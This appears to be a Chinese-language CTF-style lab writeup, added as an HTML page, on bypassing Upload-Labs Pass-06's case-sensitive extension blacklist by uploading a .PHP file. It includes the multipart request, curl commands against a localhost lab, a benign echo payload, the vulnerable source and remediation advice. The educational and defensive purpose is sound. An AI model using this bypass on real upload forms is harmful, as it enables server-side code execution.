@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload-Labs Pass-06 扩展名大小写绕过 Writeup - gz2008的技术博客</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      color: #1e293b;
+      background: #f6f9fc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      line-height: 1.8;
+    }
+    .container {
+      width: min(860px, 100%);
+      margin: 0 auto;
+      padding: 40px;
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .06);
+    }
+    .back-link { color: #2563eb; text-decoration: none; font-weight: 600; }
+    .back-link:hover { text-decoration: underline; }
+    h1 {
+      margin: 20px 0 10px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #eef2f6;
+      color: #0f172a;
+      font-size: clamp(1.8rem, 5vw, 2.3rem);
+      line-height: 1.35;
+    }
+    .tags { margin: 12px 0 26px; }
+    .tag {
+      display: inline-block;
+      margin: 0 8px 8px 0;
+      padding: 4px 12px;
+      color: #2563eb;
+      background: #eff6ff;
+      border-radius: 20px;
+      font-size: .85rem;
+      font-weight: 600;
+    }
+    h2 {
+      margin-top: 34px;
+      padding-left: 10px;
+      border-left: 4px solid #3b82f6;
+      color: #1e293b;
+      font-size: 1.35rem;
+    }
+    h3 { margin-top: 24px; color: #334155; font-size: 1.05rem; }
+    p, li { color: #475569; }
+    code {
+      padding: 2px 5px;
+      color: #be123c;
+      background: #f1f5f9;
+      border-radius: 4px;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      overflow-wrap: anywhere;
+    }
+    pre {
+      padding: 16px;
+      color: #e2e8f0;
+      background: #172033;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      font-size: .9rem;
+      line-height: 1.6;
+    }
+    pre code { padding: 0; color: inherit; background: none; }
+    figure { margin: 24px 0; }
+    figure img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(15, 23, 42, .07);
+    }
+    figcaption {
+      margin-top: 9px;
+      color: #64748b;
+      font-size: .9rem;
+      text-align: center;
+    }
+    .note, .success {
+      margin: 18px 0;
+      padding: 13px 16px;
+      border-left: 4px solid #f97316;
+      background: #fff7ed;
+      color: #9a3412;
+    }
+    .success {
+      border-left-color: #22c55e;
+      background: #f0fdf4;
+      color: #166534;
+    }
+    table { width: 100%; margin: 16px 0; border-collapse: collapse; }
+    th, td { padding: 9px 11px; border: 1px solid #e2e8f0; text-align: left; }
+    th { color: #1e3a8a; background: #eff6ff; }
+    @media (max-width: 640px) {
+      body { padding: 0; }
+      .container { padding: 24px 18px; border-radius: 0; }
+      table { display: block; overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <a class="back-link" href="index.html">← 返回 Upload-Labs 首页</a>
+
+    <h1>Upload-Labs Pass-06：扩展名大小写绕过</h1>
+    <div class="tags">
+      <span class="tag"># Upload-Labs</span>
+      <span class="tag"># Web</span>
+      <span class="tag"># File Upload</span>
+      <span class="tag"># Burp Suite</span>
+      <span class="tag"># Case Bypass</span>
+    </div>
+
+    <p>本文记录本机授权靶场 <code>http://127.0.0.1:8081/Pass-06/index.php</code> 的实验过程。Pass-06 使用扩展名黑名单拦截 PHP 文件，但判断过程区分大小写；把文件扩展名从 <code>.php</code> 改为 <code>.PHP</code>，即可让应用放行，而目标环境仍会把上传文件交给 PHP 解析。</p>
+
+    <h2>一、实验信息</h2>
+    <table>
+      <tr><th>项目</th><th>内容</th></tr>
+      <tr><td>靶场</td><td>Upload-Labs</td></tr>
+      <tr><td>关卡</td><td>Pass-06</td></tr>
+      <tr><td>漏洞类型</td><td>黑名单扩展名校验不完整，大小写绕过</td></tr>
+      <tr><td>工具</td><td>Burp Suite、浏览器、curl</td></tr>
+      <tr><td>验证目标</td><td>上传 PHP 文件，访问生成路径并确认代码执行</td></tr>
+    </table>
+
+    <h2>二、功能观察</h2>
+    <p>页面要求上传一个 <code>webshell</code>，上传控件却提示“请选择要上传的图片”。先选择一个普通文件名为 <code>一句话木马.php</code> 的文件提交，并用 Burp 观察 multipart 请求；低版本实验阶段保留原始文件名，不修改任何请求字段。</p>
+
+    <p>在 Repeater 中可以更完整地看到文件字段。初始请求的文件名为 <code>一句话木马.php</code>，内容为一段仅用于本地靶场的 PHP 代码：</p>
+
+    <figure>
+      <img src="assets/upload_labs_pass06_request.png" alt="Burp Repeater 中查看 Pass-06 multipart 上传请求">
+      <figcaption>原始请求保留小写 <code>.php</code> 扩展名，文件内容位于 multipart 请求体中。</figcaption>
+    </figure>
+
+    <h2>三、请求与载荷</h2>
+    <p>截图中的 webshell 请求体如下。本文的最终验证改用只输出固定标记的无副作用脚本，避免把上传成功与命令执行结果混为一谈。</p>
+
+    <pre><code>POST /Pass-06/index.php HTTP/1.1
+Host: 127.0.0.1:8081
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXAMPLE
+
+------WebKitFormBoundaryEXAMPLE
+Content-Disposition: form-data; name="upload_file"; filename="pass06_probe.php"
+Content-Type: application/octet-stream
+
+&lt;?php echo "PASS06_EXEC_OK"; ?&gt;
+------WebKitFormBoundaryEXAMPLE
+Content-Disposition: form-data; name="submit"
+
+上传
+------WebKitFormBoundaryEXAMPLE--</code></pre>
+
+    <h2>四、漏洞定位</h2>
+    <p>点击页面的“显示源码”后，可以看到服务端用数组维护扩展名黑名单，再通过 <code>strrchr()</code> 提取最后一个点及其后的内容。下面仅保留与本关相关的逻辑，黑名单其余项用 <code>...</code> 省略：</p>
+
+    <pre><code>$deny_ext = array(".php", ".php5", ".php4", ".pHp", ".pHp5", ...);
+$file_name = trim($_FILES['upload_file']['name']);
+$file_ext = strrchr($file_name, '.');
+
+if (!in_array($file_ext, $deny_ext)) {
+    $img_path = UPLOAD_PATH . '/' . date("YmdHis") . rand(1000, 9999) . $file_ext;
+    move_uploaded_file($_FILES['upload_file']['tmp_name'], $img_path);
+}</code></pre>
+
+    <p>关键问题有两个：</p>
+    <ul>
+      <li><code>in_array($file_ext, $deny_ext)</code> 对字符串执行区分大小写的比较；黑名单只列出了部分混合大小写形式，没有覆盖 <code>.PHP</code>。</li>
+      <li>文件落盘后，扩展名由请求文件名直接拼接得到。目标环境的脚本处理器又会把大写 <code>.PHP</code> 当作 PHP 文件执行。</li>
+    </ul>
+
+    <div class="note">“Windows 后缀限制”这个说法不够准确。Windows 本身没有限制上传 <code>.PHP</code>；本关的放行点是应用黑名单区分大小写，随后才是 Windows 文件系统和 Web 服务器映射对扩展名大小写的处理方式。</div>
+
+    <h2>五、复现与验证</h2>
+    <p>在 Burp Repeater 中只修改文件字段的 <code>filename</code>：</p>
+
+    <pre><code>filename="pass06_probe.php"</code></pre>
+
+    <p>改为：</p>
+
+    <pre><code>filename="pass06_probe.PHP"</code></pre>
+
+    <p>保持请求体、MIME 类型和其他字段不变，重新发送。为了排除偶然性，也可以直接用等价请求连续验证两次：</p>
+
+    <pre><code>curl.exe -sS -i -X POST "http://127.0.0.1:8081/Pass-06/index.php" -F "upload_file=@.\\upload-pass06-probe.php;filename=pass06_probe.php;type=application/octet-stream" -F "submit=上传"
+
+curl.exe -sS -i -X POST "http://127.0.0.1:8081/Pass-06/index.php" -F "upload_file=@.\\upload-pass06-probe.php;filename=pass06_probe.PHP;type=application/octet-stream" -F "submit=上传"</code></pre>
+
+    <p>两次响应形成了清晰对照：</p>
+
+    <table>
+      <tr><th>请求文件名</th><th>服务端结果</th></tr>
+      <tr><td><code>pass06_probe.php</code></td><td><code>提示：此文件类型不允许上传！</code></td></tr>
+      <tr><td><code>pass06_probe.PHP</code></td><td>上传成功，返回路径 <code>../upload/202610281355254498.PHP</code></td></tr>
+    </table>
+
+    <div class="success">小写扩展名被黑名单拦截；仅将扩展名改为大写后，同一份文件内容通过检查并成功写入 <code>upload/</code> 目录。</div>
+
+    <p>最后访问响应中给出的文件路径：</p>
+
+    <pre><code>curl.exe -sS "http://127.0.0.1:8081/upload/202610281355254498.PHP"</code></pre>
+
+    <p>响应正文为：</p>
+
+    <pre><code>PASS06_EXEC_OK</code></pre>
+
+    <figure>
+      <img src="assets/upload_labs_pass06_result.png" alt="访问上传后的 PHP 文件得到固定执行标记">
+      <figcaption>访问大写扩展名文件后，页面返回 PHP 执行产生的固定标记。</figcaption>
+    </figure>
+
+    <p>这不是源码回显，因为响应中不存在 <code>&lt;?php ... ?&gt;</code>；固定字符串由 PHP 执行后输出，因此同时验证了文件已落盘、Web 路径可访问以及上传文件被解析执行。</p>
+
+    <h2>六、影响与修复</h2>
+    <p>扩展名黑名单只要漏掉一个可执行变体，就可能让上传文件进入 Web 目录。若服务器继续解析该扩展名，文件上传漏洞就会转化为服务器端代码执行。</p>
+
+    <ul>
+      <li>不要维护可执行扩展名黑名单，改用明确的服务端扩展名白名单。</li>
+      <li>检查前统一转为小写，例如 <code>strtolower(pathinfo($file_name, PATHINFO_EXTENSION))</code>，但大小写归一化只能修补本关，不能替代白名单。</li>
+      <li>由服务端生成随机文件名和固定安全扩展名，不使用客户端提供的扩展名拼接落盘路径。</li>
+      <li>校验 MIME、文件内容和图像解码结果，并对图片重新编码。</li>
+      <li>将上传目录移出 Web 根目录，或在 Web 服务器层禁用上传目录的脚本执行权限。</li>
+    </ul>
+
+    <h2>七、复盘</h2>
+    <p>Pass-06 的绕过点可以概括为“应用判断为未知扩展名，服务器映射却仍将其识别为 PHP”。复现时应分别记录黑名单拒绝、文件成功写入和访问后的执行回显，避免把“页面显示上传成功”直接等同于“代码执行已验证”。本关真正要修复的不是某一个大小写变体，而是整个扩展名信任模型。</p>
+  </main>
+</body>
+</html>
